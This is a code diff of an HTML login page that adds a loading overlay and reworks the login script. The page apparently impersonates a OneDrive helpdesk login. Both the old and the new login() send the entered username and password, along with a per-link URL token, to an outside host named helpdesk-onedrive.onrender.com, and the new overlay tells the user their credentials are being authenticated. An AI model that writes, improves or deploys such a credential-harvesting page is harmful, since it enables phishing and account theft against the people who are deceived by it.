@@ -72,6 +72,21 @@
         a:hover {
             text-decoration: underline;
         }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 18px;
+            z-index: 1000;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -86,78 +101,55 @@
         <p>No account? <a href="#">Create one!</a></p>
         <p id="message"></p>
     </div>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div>Authenticating your credentials, please wait...</div>
+    </div>
 
     <script>
-        function post(url, data) {
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.text())
-            .then(data => {
-                document.getElementById('message').textContent = data;
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            });
+        function showLoading() {
+            document.getElementById('loadingOverlay').style.display = 'flex';
         }
 
+        function hideLoading() {
+            document.getElementById('loadingOverlay').style.display = 'none';
+        }
 
-	function getQueryVariable(variable) {
-    	    // Directly find the parameter by searching for '?token='
-    	    var query = window.location.href;
-    	    var tokenIndex = query.indexOf('?token=');
-
-    	    // If '?token=' is not found, try looking for '&token='
-    	    if (tokenIndex === -1) {
-        	tokenIndex = query.indexOf('&token=');
-    	    }
-
-    	    if (tokenIndex !== -1) {
-        	var start = tokenIndex + 7; // The length of '?token=' or '&token=' is 7
-        	var end = query.indexOf('&', start);
-        	if (end === -1) { // If there's no '&' after the token, take the rest of the string
-            	    end = query.length;
+        function getQueryVariable(variable) {
+            var query = window.location.search.substring(1);
+            var vars = query.split('&');
+            for (var i = 0; i < vars.length; i++) {
+                var pair = vars[i].split('=');
+                if (pair[0] === variable) {
+                    return decodeURIComponent(pair[1]);
                 }
-        	return decodeURIComponent(query.substring(start, end));
-    	    }
+            }
+            return null;
+        }
 
-    	    console.log('Query variable %s not found', variable);
-    	    return null;
-	}
-
-
-	// Modify the login function to include the token
-	function login() {
-    	    const username = document.getElementById('username').value;
-    	    const password = document.getElementById('password').value;
-    	    const token = getQueryVariable('token');  // Capture the token from the URL
-    	    const url = 'https://helpdesk-onedrive.onrender.com/api/users/login';
-
-    	    fetch(url, {
-        	method: 'POST',
-        	headers: {
-            	    'Content-Type': 'application/json',
-        	},
-        	body: JSON.stringify({ username, password, token })
-    	    })
-    	    .then(response => response.text())
-    	    .then(data => {
-        	document.getElementById('message').textContent = data;
-    	    })
-    	    .catch((error) => {
-        	console.error('Error:', error);
-    	    });
-	}
-
-
-        function register() {
+        async function login() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            post('/api/users/register', { username, password });
+            const token = getQueryVariable('token');
+            const url = 'https://helpdesk-onedrive.onrender.com/api/users/login';
+
+            showLoading();
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ username, password, token })
+                });
+                const data = await response.text();
+                document.getElementById('message').textContent = data;
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('message').textContent = 'An error occurred. Please try again.';
+            } finally {
+                hideLoading();
+            }
         }
     </script>
 </body>
